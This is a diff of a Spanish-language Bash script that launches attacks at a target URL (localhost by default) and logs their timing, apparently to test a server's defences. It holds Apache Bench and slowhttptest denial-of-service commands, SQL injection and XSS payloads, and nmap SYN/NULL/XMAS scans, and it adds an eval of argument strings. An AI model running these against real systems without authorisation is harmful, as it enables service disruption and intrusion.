@@ -3,9 +3,7 @@
 TARGET=${1:-http://localhost}
 TIPO_ATAQUE=$2
 LOGFILE="resultados_ataques.txt"
-MODE=${2:-"--test"}
 
-# Verifica si la URL tiene prefijo http
 [[ "$TARGET" =~ ^http ]] || TARGET="http://$TARGET"
 
 function log() {
@@ -14,10 +12,15 @@ function log() {
 
 function medir_tiempo() {
   local start=$(date +%s%3N)
-  "$@" | tee -a "$LOGFILE"
+  local cmd="$*"
+  local output
+  output=$(eval "$cmd" 2>&1)
+  local status=$?
   local end=$(date +%s%3N)
   local duration=$((end - start))
+  echo "$output" | tee -a "$LOGFILE"
   echo "[⏱] Tiempo de ejecución: ${duration} ms" | tee -a "$LOGFILE"
+  return $status
 }
 
 function ataque_ddos() {
@@ -44,8 +47,7 @@ function ataque_ddos() {
 
 function ataque_ddos_saturacion() {
   log "Apache Bench: 1000 peticiones / 100 concurrencia"
-  ab_output=$(ab -n 1000 -c 100 "$TARGET/" 2>&1)
-  echo "$ab_output" | tee -a "$LOGFILE"
+  medir_tiempo ab -n 1000 -c 100 "$TARGET/"
 }
 
 function ataque_ddos_slow() {
@@ -54,41 +56,46 @@ function ataque_ddos_slow() {
     echo "[!] slowhttptest no está instalado." | tee -a "$LOGFILE"
     return
   fi
-  slowhttptest -c 200 -H -i 10 -r 200 -t GET -u "$TARGET/" -x 24 -p 3 -l 10 | tee -a "$LOGFILE"
+  medir_tiempo slowhttptest -c 200 -H -i 10 -r 200 -t GET -u "$TARGET/" -x 24 -p 3 -l 10
 }
 
 function ataque_sqli() {
   log "Ataque SQL Injection"
-  local respuesta
-  respuesta=$(curl -s -w "\n[HTTP_CODE:%{http_code}]" "$TARGET/?id=1 UNION SELECT * FROM users WHERE '1'='1'")
-  echo "$respuesta" | tee -a "$LOGFILE"
+  local code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?id=1 UNION SELECT * FROM users WHERE '1'='1'")
+  echo "[HTTP_CODE:$code]" | tee -a "$LOGFILE"
 }
 
 function ataque_xss() {
   log "Ataque XSS"
-  local respuesta
-  respuesta=$(curl -s -w "\n[HTTP_CODE:%{http_code}]" "$TARGET/?search=<script>alert('x')</script>")
-  echo "$respuesta" | tee -a "$LOGFILE"
+  local code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?search=<script>alert('x')</script>")
+  echo "[HTTP_CODE:$code]" | tee -a "$LOGFILE"
 }
 
 function escaneo_puertos() {
   log "Escaneo SYN"
-  medir_tiempo nmap -sS -Pn -T4 -p- $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
+  medir_tiempo sudo nmap -sS -Pn -T4 -p- "$(echo "$TARGET" | sed 's|http[s]*://||')"
 }
 
 function escaneo_null() {
   log "Escaneo NULL"
-  medir_tiempo nmap -sN -Pn $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
+  medir_tiempo sudo nmap -sN -Pn "$(echo "$TARGET" | sed 's|http[s]*://||')"
 }
 
 function escaneo_xmas() {
   log "Escaneo XMAS"
-  medir_tiempo nmap -sX -Pn $(echo "$TARGET" | sed 's|http[s]*://||') 2>/dev/null
+  medir_tiempo sudo nmap -sX -Pn "$(echo "$TARGET" | sed 's|http[s]*://||')"
 }
 
 function prueba_http() {
   log "Acceso normal"
-  medir_tiempo curl -s "$TARGET" -o /dev/null
+  local start=$(date +%s%3N)
+  if curl -s -o /dev/null "$TARGET"; then
+    echo "[✓] Acceso exitoso a $TARGET" | tee -a "$LOGFILE"
+  else
+    echo "[✖] No se pudo acceder a $TARGET" | tee -a "$LOGFILE"
+  fi
+  local end=$(date +%s%3N)
+  echo "[⏱] Tiempo de ejecución: $((end - start)) ms" | tee -a "$LOGFILE"
 }
 
 function ejecutar_todo() {
